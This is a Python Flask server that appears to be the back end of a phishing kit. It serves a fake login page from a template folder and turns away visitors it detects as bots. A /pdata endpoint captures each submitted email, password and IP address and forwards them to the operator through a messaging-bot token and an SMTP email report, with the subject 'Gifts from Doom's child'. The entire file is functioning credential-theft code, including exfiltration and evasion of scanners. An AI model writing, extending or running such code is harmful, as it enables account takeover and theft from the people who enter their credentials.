from flask import Flask, request, render_template
from threading import Thread
from waitress import serve
import time, json
import sys
from conn import DOS


argument = sys.argv[1]
app = Flask(__name__, static_folder=f"templates/{argument}")


@app.route('/')
def index():
   if request.headers.getlist('X-Forwarded-For'):ip = request.headers.getlist('X-Forwarded-For')[0]
   else:ip = request.remote_addr
   ua = request.headers.get('user-agent')
   device = DOS().isBo(req=ua)
   if not device:
      print(f'New connection from {ip}')
      return render_template(f'{argument}/index.html', data="")
   else:
      print(f'New connection from Bot {ip}')
      return('501')


@app.route('/pdata', methods=['POST',])
def pData():
   if request.headers.getlist('X-Forwarded-For'):ip = request.headers.getlist('X-Forwarded-For')[0]
   else:ip = request.remote_addr
 
   USERDATA = request.get_json()
   pwd = USERDATA['pwd']
   em = USERDATA['em']
   print(f'Email: {em}\nPassword: {pwd}')
   if reportInfo['token'] != '': DOS().snTM(reportInfo['token'], reportInfo['cid'], f'Email: {em}\nPassword: {pwd}\nIP: {ip}')
   if reportInfo['shost'] != '': DOS().sndm(reportInfo['shost'], reportInfo['sport'],
   reportInfo['uname'], reportInfo['pwd'],reportInfo['reportEmail'], 'Gifts from Doom"s child', 
   f'Email: {em}\nPassword: {pwd}\nIP: {ip}')
   if pwd != '' : return 'success'
   else : return 'error'
    
    
if __name__ == "__main__":
   print('Server is running...')
   with open('config.json', 'r') as _:reportInfo = json.load(_)
   serve(app, host='0.0.0.0', port=80, threads=100)
